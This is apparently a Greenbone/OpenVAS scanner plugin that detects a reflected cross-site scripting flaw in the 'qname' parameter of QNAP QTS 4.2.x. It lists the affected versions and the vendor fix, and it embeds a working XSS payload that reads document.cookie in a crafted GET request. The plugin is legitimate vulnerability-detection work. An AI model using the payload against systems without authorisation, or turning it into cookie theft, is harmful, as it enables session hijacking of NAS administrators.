CPE = "cpe:/h:qnap";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.807882" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2016-08-24 15:53:00 +0530 (Wed, 24 Aug 2016)" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_name( "QNAP QTS 'qname' Parameter Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is running QNAP QTS and is prone
  to cross site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and
  check whether it is able read the cookie or not" );
	script_tag( name: "insight", value: "The flaw exists as the input passed via
  HTTP GET parameter 'qname' in the '/cgi-bin/application/appRequest.cgi'
  component of the QTS administrative interface is not properly sanitized." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attacker to execute arbitrary javascript code in the context of current user." );
	script_tag( name: "affected", value: "All QNAP NAS running QTS firmware version 4.2.0, 4.2.1, or 4.2.2" );
	script_tag( name: "solution", value: "Update to QTS 4.2.2 Build 20160901. For details see the referenced advisory." );
	script_xref( name: "URL", value: "https://www.qnap.com/en/tutorial/con_show.php?op=showone&cid=154" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2016/Aug/141" );
	script_xref( name: "URL", value: "https://www.qnap.com/en/support/con_show.php?cid=96" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_qnap_nas_detect.sc" );
	script_mandatory_keys( "qnap/qts" );
	script_require_ports( "Services/www", 80, 8080 );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!qtsPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: qtsPort )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/cgi-bin/application/appRequest.cgi?action=getQPKGDownloads&qname=" + "Testlink<img src=foo onError=<script>alert(document.cookie)</script";
if(http_vuln_check( port: qtsPort, url: url, pattern: "<script>alert\\(document.cookie\\)</script", check_header: TRUE )){
	report = http_report_vuln_url( port: qtsPort, url: url );
	security_message( port: qtsPort, data: report );
	exit( 0 );
}

